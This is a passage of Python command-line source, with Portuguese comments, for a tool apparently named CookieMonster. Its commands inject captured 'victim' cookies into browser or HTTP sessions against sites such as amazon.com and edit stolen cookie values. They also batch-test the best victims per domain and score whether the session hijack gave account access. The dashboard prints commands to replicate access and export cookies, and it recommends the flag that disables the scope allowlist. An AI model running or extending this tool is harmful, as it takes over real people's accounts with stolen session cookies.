        ], indent=2, ensure_ascii=False)

    if output:
        Path(output).write_text(out_text, encoding="utf-8")
        console.print(f"[green]Exportados {len(cookies)} cookies para {output}[/green]")
    else:
        click.echo(out_text)


# ---- Fase D: dashboard -- resumo amigavel dos ultimos runs ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--limit", type=int, default=10, show_default=True,
              help="Numero de runs recentes a mostrar")
def dashboard(db_path: Path, limit: int):
    """Mostra os ultimos N runs com classificacao amigavel.

    Destaque para:
      - ACESSO CONFIRMADO (estado CONFIRMED)
      - ACESSO PROVAVEL (estado LIKELY)
      - ACESSO REJEITADO (estado ANONYMOUS)
      - INDETERMINADO (estado UNKNOWN)
    """
    from collections import Counter

    store = _load_store(str(db_path))

    console.print(f"[bold bright_white]=== CookieMonster: Dashboard ===[/]\n")

    # Sumario por estado (todos os runs)
    all_runs = store.list_runs()
    if not all_runs:
        console.print("[yellow]Nenhum run registrado ainda. Rode 'probe' ou 'check'.[/]")
        return

    state_counter = Counter((r["state"] or "?") for r in all_runs)
    total = len(all_runs)
    confirmed = state_counter.get("CONFIRMED", 0)
    likely = state_counter.get("LIKELY", 0)
    anonymous = state_counter.get("ANONYMOUS", 0)
    unknown = state_counter.get("?", 0) + state_counter.get("UNKNOWN", 0)

    # Subdivide LIKELY: api_only (sinal soh de API) vs UI real
    # Runs antigos (pre-api_only) nao tem o campo; conta como UI real
    # para nao inflar artificialmente o grupo api_only.
    likely_api_only = 0
    likely_ui_real = 0
    likely_unknown = 0
    for r in all_runs:
        if (r["state"] or "?") != "LIKELY":
            continue
        ev_raw = r["evidence_json"]
        if isinstance(ev_raw, str):
            try:
                ev = json.loads(ev_raw)
            except Exception:
                ev = {}
        elif ev_raw is None:
            ev = {}
        else:
            ev = dict(ev_raw)
        if "api_only_confirmed" not in ev:
            likely_unknown += 1
        elif ev.get("api_only_confirmed"):
            likely_api_only += 1
        else:
            likely_ui_real += 1

    console.print(f"[bold]TOTAL: {total} runs[/bold]")
    console.print(f"  [green]CONFIRMED (acesso confirmado): {confirmed}[/green]")
    if likely and (likely_api_only or likely_unknown):
        console.print(f"  [cyan]LIKELY (acesso provavel):       {likely}[/cyan]")
        if likely_ui_real:
            console.print(f"    [dim]├─ UI real (markers DOM):       {likely_ui_real}[/dim]")
        if likely_api_only:
            console.print(f"    [dim]├─ api_only (soh API, sem UI): {likely_api_only}[/dim]")
        if likely_unknown:
            console.print(f"    [dim]└─ runs antigos (sem flag):     {likely_unknown}[/dim]")
    else:
        console.print(f"  [cyan]LIKELY (acesso provavel):     {likely}[/cyan]")
    console.print(f"  [red]ANONYMOUS (acesso rejeitado):   {anonymous}[/red]")
    console.print(f"  [yellow]UNKNOWN (indeterminado):       {unknown}[/yellow]")
    console.print()

    # Diagnostico dos UNKNOWN: agrega unknown_reasons de todos os runs
    unknown_runs = [r for r in all_runs if (r["state"] or "?") == "UNKNOWN"]
    if unknown_runs:
        motivo_counter = Counter()
        for r in unknown_runs:
            try:
                import json as _json
                ev = r.get("evidence_json")
                if isinstance(ev, str):
                    ev = _json.loads(ev)
                elif ev is None:
                    ev = {}
                for m in (ev.get("unknown_reasons") or ["sem_diferencial"]):
                    motivo_counter[m] += 1
            except Exception:
                motivo_counter["sem_diferencial"] += 1
        console.print(f"[bold]Diagnostico dos {len(unknown_runs)} UNKNOWN (motivos):[/bold]")
        for m, n in motivo_counter.most_common(6):
            console.print(f"  [yellow]{m:30}[/] {n} runs")
        console.print(f"  [dim]Glossario: login_redirect=mandou p/ login | "
                      f"api_anon_status=API 401/403 | js_errors=erros JS | "
                      f"sem_diferencial=base=inj (cookies aceitos, UI identica)[/dim]")
        console.print()

    # Ultimos N runs com classificacao amigavel
    console.print(f"[bold]ULTIMOS {limit} RUNS:[/bold]\n")
    recent = all_runs[:limit]

    table_data = []
    for r in recent:
        state = r["state"] or "?"
        state_pt = {
            "CONFIRMED": "[green]CONFIRMED[/]",
            "LIKELY": "[cyan]LIKELY[/]",
            "ANONYMOUS": "[red]ANONYMOUS[/]",
            "UNKNOWN": "[yellow]UNKNOWN[/]",
            "?": "[dim]?[/]",
        }
        state_disp = state_pt.get(state, state)
        channel = r["channel"] or "?"
        channel_disp = "PW" if channel == "playwright" else "HTTP" if channel == "httpx" else channel
        run_id = r["id"]
        domain = r["target_domain"]
        victim_id = r["victim_id"]
        findings = r["finding_count"] or 0
        table_data.append((run_id, domain, victim_id, state_disp, channel_disp, findings))

    # Renderiza tabela manual
    console.print(f"  {'ID':>4}  {'DOMINIO':28}  {'VID':>5}  {'ESTADO':30}  {'CH':4}  {'ARTEFATOS':>9}")
    console.print("  " + "-" * 90)
    for run_id, domain, victim_id, state_disp, channel_disp, findings in table_data:
        console.print(f"  {run_id:>4}  {domain[:28]:28}  {victim_id:>5}  {state_disp:30}  {channel_disp:4}  {findings:>9}")
    console.print()

    # Destaque: alvos com acesso confirmado
    confirmed_runs = [r for r in all_runs if r["state"] == "CONFIRMED"]
    if confirmed_runs:
        console.print(f"[bold green]>>> {len(confirmed_runs)} ALVO(S) COM ACESSO CONFIRMADO:[/]")
        seen = set()
        for r in confirmed_runs[:5]:
            key = (r["target_domain"], r["victim_id"])
            if key in seen:
                continue
            seen.add(key)
            console.print(f"  - [cyan]{r['target_domain']}[/] vitima={r['victim_id']} (run_id={r['id']})")
        console.print(f"\n  [dim]Replicar acesso: python -m cookiemonster access --domain {confirmed_runs[0]['target_domain']}[/dim]")
        console.print(f"  [dim]Exportar cookies: python -m cookiemonster export-cookies --domain {confirmed_runs[0]['target_domain']}[/dim]")
    else:
        console.print(f"[bold yellow]>>> NENHUM ACESSO CONFIRMADO nos runs existentes.[/]")
        console.print(f"  [dim]Dica: rode probe/playwright em mais alvos para confirmar.[/dim]")
        console.print(f"  [dim]  python -m cookiemonster probe-all --domain <alvo> --channel httpx --allow-unsafe-scope[/dim]")


def classify(name: str) -> str:
    """Classifica nome de cookie em 'auth'/'anon'/'other' (heuristica)."""
    from .domain.selection import classify_name
    return classify_name(name)


# ---- Fase M2 (injeção & edição) ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--url", required=True, help="URL a abrir (ex.: https://www.amazon.com)")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="playwright", show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
              help="Diretorio para salvar screenshot (Playwright)")
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo (fail-safe). NAO recomendado.")
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True,
              help="Modo de replay (STRICT preserva fingerprint do dump).")
def inject(db_path: Path, victim: int, domain: str, url: str, channel: str,
           req_path: str, shot_dir: Path, allow_unsafe_scope: bool, replay_mode: str):
    """Injeta os cookies da vítima num contexto de requisição e reporta o envio."""
    from .domain.matcher import applicable_cookies
    from .inject import httpx_client, playwright_client
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    scheme = "http" if url.startswith("http://") else "https"
    host = domain.split("://")[-1].strip("/")

    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
        return

    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    if not cookies:
        console.print(f"[yellow]Nenhum cookie aplicável para {scheme}://{host}{req_path}[/]")
        return

    console.print(f"[bold]{len(cookies)} cookies aplicáveis; canal={channel}[/]")

    if channel == "httpx":
        result = httpx_client.get(url, cookies)
        result["sent_cookies"] = []
    else:
        shot_path = None
        if shot_dir:
            shot_dir.mkdir(parents=True, exist_ok=True)
            shot_path = shot_dir / f"victim_{victim}_{host}.png"
        result = playwright_client.replay(url, cookies, screenshot_path=shot_path, mode=replay_mode)

    if result.get("error"):
        console.print(f"[red]Erro no replay: {result['error']}[/]")
        return

    console.print(f"status={result.get('status_code')} final={result.get('final_url')}")

    if channel == "playwright":
        injected_names = {c["name"] for c in cookies}
        sent_names = set(result.get("cookie_jar") or [])
        not_sent = sorted(injected_names - sent_names)
        unexpected = sorted(sent_names - injected_names)
        if sent_names:
            console.print(f"[green]Enviados ao alvo ({len(sent_names)}):[/] "
                          + ", ".join(sorted(sent_names)))
        if not_sent:
            console.print(f"[dim]Não enviados ({len(not_sent)}):[/] "
                          + ", ".join(not_sent))
        if unexpected:
            console.print(f"[dim]Inesperados (cookie_jar sem injetado, {len(unexpected)}):[/] "
                          + ", ".join(unexpected))
        if result.get("screenshot"):
            console.print(f"[dim]Screenshot: {result['screenshot']}[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True)
@click.option("--cookie", required=True, help="Nome do cookie a alterar")
@click.option("--value", required=True, help="Novo valor")
def edit(db_path: Path, victim: int, domain: str, cookie: str, value: str):
    """Altera o valor de um cookie capturado (replay de artefato editado)."""
    store = _load_store(str(db_path))
    n = store.update_cookie_value(victim, domain, cookie, value)
    console.print(f"[green]Atualizadas {n} linha(s) de '{cookie}[/]' "
                  f"para vítima {victim}@{domain}")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--url", default=None, help="URL alvo (padrão: https://<host>/")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="playwright", show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
              help="Salva screenshots de baseline/injetado")
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo (fail-safe). NAO recomendado.")
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True,
              help="Modo de replay (STRICT preserva fingerprint do dump).")
@click.option("--max-wait-ms", type=int, default=8000, show_default=True,
              help="Espera maxima por readiness da aplicacao (Playwright).")
def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
          req_path: str, shot_dir: Path, allow_unsafe_scope: bool,
          replay_mode: str, max_wait_ms: int):
    """[M3] Valida se o session hijack teve sucesso no domínio alvo."""
    from .domain.matcher import applicable_cookies
    from .validate.auth_state import (detect_baseline_vs_injected as detect,
                                    extract_evidence_state as _ev_state,
                                    CONFIRMED, LIKELY, ANONYMOUS, UNKNOWN)
    from .validate.scoring import score_artifacts
    from .inject import httpx_client, playwright_client
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")
    target_url = url or f"https://{host}{req_path}"
    scheme = "http" if target_url.startswith("http://") else "https"

    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
        return

    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    console.print(f"[bold]check[/] vítima={victim} {scheme}://{host}{req_path} "
                  f"[{len(cookies)} cookies aplicáveis, canal={channel}]")

    def replay(shot_suffix, with_cookies):
        shot_path = None
        if shot_dir:
            shot_dir.mkdir(parents=True, exist_ok=True)
            shot_path = shot_dir / f"victim_{victim}_{host}_{shot_suffix}.png"
        if channel == "httpx":
            res = httpx_client.get(target_url, with_cookies)
            res.setdefault("sent_cookies", [])
            # httpx nao captura quais cookies foram enviados; aproxima pelos injetados.
            res["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(with_cookies)}}]
            res.setdefault("error", None)
            return res
        return playwright_client.replay(
            target_url, with_cookies, screenshot_path=shot_path,
            mode=replay_mode, max_wait_ms=max_wait_ms,
        )

    # Baseline (sem cookies).
    baseline = replay("baseline", [])
    if not _verify_effective_urls(baseline, scope_util, allow_unsafe_scope):
        return
    # Injetado (com cookies).
    injected = replay("injected", cookies)
    if not _verify_effective_urls(injected, scope_util, allow_unsafe_scope):
        return

    if baseline.get("evidence") and injected.get("evidence"):
        result = detect(
            baseline_evidence=baseline["evidence"],
            injected_evidence=injected["evidence"],
            domain=host,
        )
    else:
        # Canal httpx (sem probe estruturado): usa detector por markers.
        from .validate.auth_state import detect_from_summary
        result = detect_from_summary(baseline, injected, host)
    sent_names = list(injected.get("cookie_jar") or [])
    artifacts = score_artifacts(sent_names, cookies)

    # Persistência.
    from .report import json_out
    evidence_blob = json_out.dumps({
        "state": result["state"], "confidence": result["confidence"],
        "profile": result["profile"],
        "differential": result.get("differential") or {},
        "baseline_evidence": result.get("baseline") or {},
        "injected_evidence": result.get("injected") or {},
        "baseline": {k: baseline.get(k) for k in
                     ("status_code", "final_url", "title")},
        "injected": {k: injected.get(k) for k in
                      ("status_code", "final_url", "title", "evidence")},
    })
    run_id = store.record_run(victim, target_url, host, channel,
                              state=result["state"],
                              confidence=result["confidence"],
                              evidence_json=evidence_blob)
    findings_rows = [
        (run_id, a["name"], 1 if a["sent"] else 0, a["kind"],
         float(a["score"]) / 10.0, "")
        for a in artifacts
    ]
    store.add_findings(run_id, findings_rows)

    _print_check_result(result, sent_names, artifacts, injected)



def _verify_effective_urls(result: dict, scope_util, unsafe: bool) -> bool:
    """Retorna True se todos os hosts efetivamente acessados estao na allowlist."""
    urls = [result.get("final_url")] if result.get("final_url") else []
    urls += [r.get("url") for r in result.get("redirect_chain", []) if r.get("url")]
    for u in urls:
        if not u:
            continue
        host = u.split("://")[-1].split("/")[0].split(":")[0]
        if not scope_util.allowed(host, unsafe=unsafe):
            console.print(f"[red]Recusado: redirect para fora da allowlist: {host}[/]")
            return False
    return True


def _tri_label(value):
    return {1: "yes", 0: "no", -1: "?"}.get(value,)


def _print_check_result(result, sent_names, artifacts, injected):
    from .validate.auth_state import (
        CONFIRMED as _C, LIKELY as _L, ANONYMOUS as _A, UNKNOWN as _U,
    )
    state = result["state"]
    color = {"CONFIRMED": "green", "LIKELY": "cyan", "ANONYMOUS": "red",
             "UNKNOWN": "yellow"}.get(state, "yellow")
    console.print(f"\n[bold {color}]{state}[/] (confianca {result['confidence']:.2f}, perfil {result['profile']})")

    ev = result.get("evidence") or {}
    inj_ev = ev.get("injected_evidence") or result.get("injected") or {}
    base_ev = ev.get("baseline_evidence") or result.get("baseline") or {}
    differential = result.get("differential") or {}

    if state == _U:
        if injected.get("error"):
            console.print(f"  [yellow]UNKNOWN_REASON[/]: replay error: {injected.get('error')}")
        elif not inj_ev and not base_ev:
            console.print("  [yellow]UNKNOWN_REASON[/]: cliente httpx (sem probe estruturado)")
        elif inj_ev.get("console_errors"):
            console.print("  [yellow]UNKNOWN_REASON[/]: frontend JS errors (ver console_errors)")
        elif inj_ev.get("request_failures"):
            console.print("  [yellow]UNKNOWN_REASON[/]: request failures (ver request_failures)")
        else:
            console.print("  [yellow]UNKNOWN_REASON[/]: sem diferenca significativa (cookies aceitos mas UI/API nao distinguem baseline de injetado)")

    if inj_ev and (inj_ev.get("api_authenticated") or inj_ev.get("api_user_id_present")
                    or inj_ev.get("authenticated_ui") or inj_ev.get("login_redirect")):
        sig = []
        if inj_ev.get("api_authenticated"):
            sig.append("api_auth")
        if inj_ev.get("api_user_id_present"):
            sig.append("api_user_id")
        if inj_ev.get("authenticated_ui"):
            sel = inj_ev.get("authenticated_selectors", [])
            sig.append("ui_auth:" + ",".join(sel[:2]) if sel else "ui_auth")
        if inj_ev.get("login_redirect"):
            sig.append("login_redirect")
        console.print(f"  sinais injetado: {' | '.join(sig)}")

    if inj_ev.get("console_errors"):
        console.print(f"  console errors: {len(inj_ev['console_errors'])}")
    if inj_ev.get("request_failures"):
        console.print(f"  request failures: {len(inj_ev['request_failures'])}")

    if differential:
        bits = []
        for k, v in differential.items():
            if k == "body_length_delta":
                bits.append(f"body_delta={v}")
            elif isinstance(v, dict):
                baseline_v = v.get("baseline")
                injected_v = v.get("injected")
                bits.append(f"{k}: base={baseline_v} inj={injected_v}")
            else:
                bits.append(f"{k}={v}")
        console.print(f"  diferencial: {' | '.join(bits)}")

    if ev.get("status_baseline") is not None:
        console.print(f"  baseline status={ev.get('status_baseline')} | injetado status={ev.get('status_injected')}")
    if ev.get("injected_markers"):
        console.print(f"  markers injetado: {', '.join(ev['injected_markers'])}")
    chain = ev.get("redirect_chain") or []
    if chain:
        chain_s = " -> ".join(f"{c['status']} {c['url']}" for c in chain[:5])
        console.print(f"  redirects: {chain_s}")
    if injected.get("error"):
        console.print(f"  [red]erro replay: {injected['error']}[/]")

    if artifacts:
        table = Table(title="Artefatos (score)")
        table.add_column("Cookie", style="cyan")
        table.add_column("Tipo")
        table.add_column("Enviado", justify="center")
        table.add_column("HttpOnly", justify="center")
        table.add_column("Secure", justify="center")
        table.add_column("SameSite")
        table.add_column("Score", justify="right")
        for a in artifacts:
            table.add_row(a["name"], a["kind"],
                          "yes" if a["sent"] else "-",
                          _tri_label(a.get("http_only_state")),
                          _tri_label(a.get("secure_state")),
                          str(a.get("same_site") or "-"),
                          str(a["score"]))
        console.print(table)
    console.print(f"[dim]Cookies enviados: {len(sent_names)}[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--out", "out_dir", type=click.Path(path_type=Path), default="reports",
              show_default=True)
def report(db_path: Path, out_dir: Path):
    """Consolida runs+findings em console, JSON e Markdown."""
    from .report import builder, console as report_console
    from .report import json_out, markdown_out

    store = _load_store(str(db_path))
    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    data = builder.build_report(store)
    report_console.render_summary(data)
    json_out.dump(data, out_dir / "report.json")
    markdown_out.dump(data, out_dir / "report.md")
    console.print(f"[green]Relatórios gerados em {out_dir}/[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--limit", type=int, default=5, show_default=True,
              help="Número de vítimas (melhores) a testar")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="httpx", show_default=True)
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo (fail-safe).")
def check_batch(db_path: Path, domain: str, limit: int, channel: str,
                allow_unsafe_scope: bool):
    """Testa as N melhores vítimas de um domínio em lote (check em sequência)."""
    store = _load_store(str(db_path))
    best = store.best_victims_for_domain(domain, limit=limit)
    if not best:
        console.print(f"[yellow]Nenhuma vítima com cookies para {domain}[/]")
        return

    victim_ids = [r["victim_id"] for r in best]
    results = []
    for vid in victim_ids:
        console.print(f"\n[bright_black]--- vítima {vid} ---[/]")
        # click.Context com forward garante que todos os kwargs cheguem.
        with click.Context(check) as cctx:
            cctx.invoke(check, db_path=db_path, victim=vid, domain=domain,
                        url=None, channel=channel, req_path="/", shot_dir=None,
                        allow_unsafe_scope=allow_unsafe_scope, replay_mode="strict")
        # Recupera o ultimo run desta vítima/domain para sumarizar.
        run = store.list_runs()
        row = next((r for r in run if r["victim_id"] == vid
                    and r["target_domain"] == domain), None)
        if row:
            results.append(row)
    console.print(f"\n[bold]Batch concluído: {len(results)} runs.[/]")


def main() -> int:
    return cli()


if __name__ == "__main__":
    main()